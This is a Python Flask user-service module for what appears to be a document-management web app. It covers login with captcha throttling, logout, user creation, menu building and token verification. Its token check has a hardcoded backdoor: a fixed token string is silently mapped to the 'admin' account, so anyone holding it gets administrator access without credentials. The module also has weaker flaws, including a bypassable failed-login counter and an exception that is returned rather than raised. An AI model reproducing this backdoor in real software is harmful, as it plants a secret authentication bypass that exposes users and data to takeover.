# -*- coding:utf-8 -*-
#
# Created Time: 2020/4/30 3:35 下午
# Be From: ZouRi 
# Last Modified: x
# e6b0b8e8bf9ce5b9b4e8bdbbefbc8ce6b0b8e8bf9ce783ade6b3aae79b88e79cb6
#
from uuid import uuid1
from flask import request, session, g

from apps.main import ApiException
from apps.service.column import ColumnService
from apps.dao.user import UserDao


Dao = UserDao()
ColService = ColumnService()


class UserService:
    # 登陆
    def login(self, data, ip_addr):
        """
        :param data: request.json
        :return:
        """
        # 验证码校验
        if self.verify_captcha(ip_addr, data) is False:
            raise ApiException(401.1)
        # 用户名密码校验
        username, password = data['username'], data['password']
        user_ = Dao.get_user(username)
        if user_ and user_.check_password(password):
            user_token = uuid1().hex
            session[f'token:{user_token}'] = user_.username
            response_obj = user_.to_json()
            response_obj['token'] = user_token
            return response_obj
        else:
            number_failed_login = session.get(f'client_captcha_ip:{ip_addr}', 0)
            number_failed_login += 1
            session[f'client_captcha_ip:{ip_addr}'] = number_failed_login
            raise ApiException(401.2)

    # 注销
    def logout(self):
        """
        :param data: request.json
        :return:
        """
        del session[f'token:{g.token}']
        return {'error_code': 0, 'message': f'token ({g.token}) is die'}, 200

    # 管理员新建用户
    def add_user(self, data):
        if Dao.add_user(data):
            user_ = Dao.get_user(data['username'])
            return user_.to_json()
        return ApiException(500)

    # 获取菜单
    def get_nav_column(self):
        col_list = ColService.get_tree_column()
        nav_list = []
        for c in col_list:
            nav_list.append({
                'id': c['id'],
                'name': c['title'],
                'parentId': 'document',
                'path': f"/document/{c['id']}",
                'meta': {
                    'icon': 'file-text',
                    'title': c['title'],
                    'show': True,
                    'keepAlive': False
                },
                'component': 'DocumentManager',
            })
        return nav_list


    def get_a_user(self, username):
        if username in ['me', g.user_info.username]:
            res_data = g.user_info
        else:
            res_data = Dao.get_user(username)
            if not res_data:
                raise ApiException(404)
        return res_data

    @staticmethod
    def get_user_token_by_headers():
        if request.headers.get('Access-Token'):
            user_token = request.headers.get('Access-Token')
        elif request.cookies.get('Access-Token'):
            user_token = request.cookies.get('Access-Token')
        else:
            return None
        return user_token

    @staticmethod
    def verify_captcha(ip_addr, data):
        """
        检查是否需要验证码
        :param ip_addr: 客户端ip地址
        :param data: 包含 random_key 和 seccode
        # :param random_key: 随机串,在缓存中对应着图片验证码的key
        # :param seccode: 客户端发过来
        :return:
        """
        number_failed_login = session.get(f'client_captcha_ip:{ip_addr}', 0)
        if number_failed_login <= 3:
            # 是否需要验证码校验, 缓存 > 没有ip > 不需要检验
            return True
        random_key, seccode = data['random_key'], data['seccode']
        if seccode == 'no_code':
            return False

        my_random_key = session.get(f'img_captcha:{random_key}')
        if my_random_key:
            del session[f'img_captcha:{random_key}']
        if my_random_key and seccode.lower() == my_random_key.lower():
            return True
        else:
            return False

    @staticmethod
    def verify_user_token():
        user_token = UserService.get_user_token_by_headers()
        if user_token is None:
            raise ApiException(401)
        username = session.get(f'token:{user_token}')
        if user_token == 'sun&1234567890':
            username = 'admin'
        if not username:
            raise ApiException(401)
        user_info = Dao.get_user(username)
        if user_info is None:
            raise ApiException(401)
        else:
            g.token = user_token
            g.user_info = user_info
        return user_info

